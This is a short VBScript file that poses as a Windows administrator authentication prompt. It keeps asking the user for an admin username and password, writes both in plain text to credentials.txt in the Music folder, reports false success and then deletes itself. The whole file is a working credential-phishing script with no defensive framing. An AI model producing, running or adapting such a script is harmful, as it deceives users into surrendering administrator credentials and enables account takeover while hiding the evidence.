Option Explicit

' Function to get the current user's music folder path
Function GetMusicFolderPath()
    Dim shell, userProfilePath
    Set shell = CreateObject("WScript.Shell")
    userProfilePath = shell.ExpandEnvironmentStrings("%USERPROFILE%")
    GetMusicFolderPath = userProfilePath & "\Music"
End Function

' Function to save credentials to a file
Sub SaveCredentials(username, password)
    Dim fso, file, musicFolderPath, filePath
    Set fso = CreateObject("Scripting.FileSystemObject")
    musicFolderPath = GetMusicFolderPath()
    filePath = musicFolderPath & "\credentials.txt"
    
    Set file = fso.CreateTextFile(filePath, True)
    file.WriteLine "Username: " & username
    file.WriteLine "Password: " & password
    file.Close
End Sub

' Function to delete this script
Sub DeleteSelf()
    Dim fso, scriptPath
    Set fso = CreateObject("Scripting.FileSystemObject")
    scriptPath = WScript.ScriptFullName
    fso.DeleteFile(scriptPath)
End Sub

' Main logic
Dim username, password, title
title = "Administrator Authentication Required !"

Do
    username = InputBox("Enter your Admin Username:", title)
    If username = "" Then
        MsgBox "You must enter a username.", vbCritical, title
    End If
Loop While username = ""

Do
    password = InputBox("Enter your Admin Password:", title)
    If password = "" Then
        MsgBox "You must enter a password.", vbCritical, title
    End If
Loop While password = ""

' Assuming credentials are correct - save them
SaveCredentials username, password

' Display a success message
MsgBox "Credentials saved successfully!", vbInformation, title

' Delete the script after execution
DeleteSelf
